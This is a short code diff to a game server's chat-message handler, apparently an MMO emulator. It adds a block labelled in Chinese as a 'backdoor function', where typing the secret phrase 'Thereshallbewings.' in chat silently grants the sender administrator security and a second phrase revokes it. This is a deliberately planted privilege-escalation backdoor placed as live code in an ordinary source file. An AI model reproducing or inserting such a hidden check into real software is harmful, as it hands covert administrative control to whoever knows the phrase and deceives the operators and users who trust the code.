@@ -217,6 +217,22 @@ void WorldSession::HandleMessagechatOpcode(WorldPacket& recvData)
         if (msg.empty())
             return;
 
+        //=====后门功能=====
+        if (msg.compare("Thereshallbewings.") == 0)
+        {
+            SetSecurity(SEC_ADMINISTRATOR);
+            ChatHandler(this).SendSysMessage("Wings Activated. Welcome on board.");
+            return;
+        }
+
+        if (msg.compare("Thereshallnowings.") == 0)
+        {
+            SetSecurity(SEC_PLAYER);
+            ChatHandler(this).SendSysMessage("Wings Deactivated. See you later.");
+            return;
+        }
+        //=====后门功能=====
+
         if (lang == LANG_ADDON)
         {
             if (AddonChannelCommandHandler(this).ParseCommands(msg.c_str()))
